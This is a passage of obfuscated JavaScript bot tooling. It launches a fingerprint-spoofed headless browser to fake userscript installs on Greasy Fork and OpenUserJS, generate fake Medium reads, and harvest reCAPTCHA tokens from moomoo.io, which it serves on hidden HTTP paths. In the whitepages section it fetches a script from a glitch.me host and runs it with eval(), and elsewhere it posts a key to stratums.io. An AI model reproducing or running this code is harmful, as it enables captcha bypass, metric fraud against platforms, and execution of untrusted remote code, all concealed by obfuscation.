      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + Z(0x1b, 'E5j)') + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + Y(0x4) + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a0(0xb) + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': Y(0x12) + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    Z(0x3, 'bglA') + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + a0(0x5) + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + Z(0x17, 'NB2t') + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x20e3 * -0x1 + -0x16 * -0x135 + 0x1 * -0x3b71
  };

function a() {
  const bo = [
    'W5xdJ8kolaTCWONcQ8k7WR8',
    'random',
    'r8oaomohu28lW7W',
    'WQXoWORdUCo3W7xcUCkED3y',
    'CMCVzw4VC2nYAq',
    'tals-1a646',
    'yxzPzIXPBwfNzq',
    'W6NdUmoEmCk7qvnHW53cRG',
    'rg/en/scri',
    'zwfZEwzVCMSUBW',
    '-width\x20yt-',
    'pts/by-sit',
    'e-image--f',
    'W5tcVXpcOmoiW4ldLrRdQmo8',
    'LWXAxz0MiH',
    'BJnlAJH6rwzLDW',
    'uzzK-052H0',
    'xCoQW7bBWPT6',
    'Ahr0Chm6lY9NCG',
    'wNLhu19btwjjyq',
    'nYvfnIvcqIvbna',
    'W4tdR8koqHrEWOpcSa',
    'z2v0rwXLBwvUDa',
    'WQJcSSowBmoMW6KcWRb7WR8',
    'vHRdUmk+mKZcNCoeW6JdLa',
    'DY55B3v0DwjLlG',
    'q1GWmdfFwKnH',
    'W6ucW7NdIbLZqd3dMmoJ',
    'Aw5ZDgfSBc1SAq'
  ];
  a = function() {
    return bo;
  };
  return a();
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x45 * -0x1d + -0xa93 * 0x1 + 0x932 * 0x2)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x569 + -0x1 * 0x268f + 0x218a), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1cc9 + -0x1571 + 0x329e), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1 * -0x1a6c + -0x305 * 0x4 + 0x2680;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x14ae * 0x1 + 0x2212 + -0x36c0; w < getRandomInt(0x251b + 0x9 * -0x2ba + 0x18 * -0x86, 0xba7 * -0x3 + 0x132b * -0x1 + 0x1 * 0x3625); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1 * 0x196f6 + -0xb1a6 + 0x51e6 * 0xa);
        }
      }();
    }, 0x95 * -0x11 + -0x1a88 + 0x41 * 0x91), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x88f * 0x1 + 0x1b2b + 0x94e * -0x2;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x2154 + 0x4d0 + 0x1c84, -0x213a + 0x1d17 + 0x455)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x526 * -0x10 + -0x2 * 0x62e7 + 0x18d5e);
    }, -0x1 * -0x1957 + 0x1750 + -0x3043), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x89 * 0x1 + 0x9e * 0x10 + -0x3 * 0x31d;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x827 + -0x15f0 + 0x1981 * 0x1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x2 * -0x126d + -0x2 * -0xfc2 + 0x556), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x145 * 0xb2f + -0x1057cd * 0x1 + 0x1c * 0x194ca);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x34b * -0x4 + 0x21c6 + -0x1436);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x13d * 0x9 + 0xca1 + -0xb4);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x25ff + 0x921 + 0x3c6e);
}
doFlags['doOUJS'] && ((async () => {
  const a4 = b,
    a3 = c;
  async function f() {
    const a2 = c,
      a1 = d,
      k = h[a1(0x1)](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x217a + -0x1 * -0x1f8f + 0x4108 * -0x1) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1 * 0x1cf9 + -0x3 * 0x1c8 + 0x2252));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0xe * -0x1 + -0xab5 + 0xaa7, D['indexOf']('\x20'));
        return B ? E['slice'](-0x2348 + -0xcf8 + 0x3040, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x2c18 + 0x2f8d + 0x5 * 0x71f),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x4412 * 0x1 + 0x79 * 0x1c + 0x586 * 0x11),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + a2(0x6) + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + a3(0x14) + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
